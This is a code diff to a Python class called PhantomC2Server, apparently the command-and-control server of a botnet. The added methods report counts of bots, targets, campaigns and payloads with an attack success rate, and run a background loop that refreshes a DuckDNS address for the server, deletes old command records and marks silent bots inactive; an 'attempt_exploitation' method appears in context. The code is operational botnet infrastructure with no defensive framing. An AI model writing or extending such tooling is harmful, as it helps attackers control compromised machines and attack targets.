@@ -150,6 +150,59 @@ class PhantomC2Server:
             campaign.status = 'failed'
             db.session.commit()
 
+    def get_server_stats(self) -> Dict[str, Any]:
+        """Get server statistics"""
+        total_bots = Bot.query.count()
+        active_bots = Bot.query.filter_by(status='active').count()
+        total_targets = Target.query.count()
+        total_campaigns = Campaign.query.count()
+        total_payloads = Payload.query.count()
+        total_tasks = Task.query.count()
+        completed_tasks = Task.query.filter_by(status='completed').count()
+        failed_tasks = Task.query.filter_by(status='failed').count()
+
+        return {
+            'total_bots': total_bots,
+            'active_bots': active_bots,
+            'total_targets': total_targets,
+            'total_campaigns': total_campaigns,
+            'total_payloads': total_payloads,
+            'total_tasks': total_tasks,
+            'completed_tasks': completed_tasks,
+            'failed_tasks': failed_tasks,
+            'success_rate': (completed_tasks / total_tasks * 100) if total_tasks > 0 else 0
+        }
+
+    def start_background_tasks(self, app):
+        """Start background tasks in a separate thread"""
+        def background_tasks():
+            """Run background tasks periodically"""
+            with app.app_context():
+                while True:
+                    try:
+                        # Update DuckDNS
+                        self.update_duckdns()
+                        
+                        # Clean up old data
+                        cutoff = datetime.now() - timedelta(days=30)
+                        Command.query.filter(Command.timestamp < cutoff).delete()
+                        
+                        # Check for inactive bots
+                        inactive_cutoff = datetime.now() - timedelta(hours=2)
+                        Bot.query.filter(Bot.last_seen < inactive_cutoff).update({'status': 'inactive'})
+                        db.session.commit()
+                        
+                    except Exception as e:
+                        logger.error(f"Background task error: {e}")
+                    
+                    # Run every 5 minutes
+                    time.sleep(300)
+
+        # Start background tasks in a separate thread
+        background_thread = threading.Thread(target=background_tasks, daemon=True)
+        background_thread.start()
+        logger.info("Background tasks started")
+
     def attempt_exploitation(self, target: Dict[str, Any], payload_id: int) -> bool:
         """Attempt to exploit a target using the specified payload"""
         try:
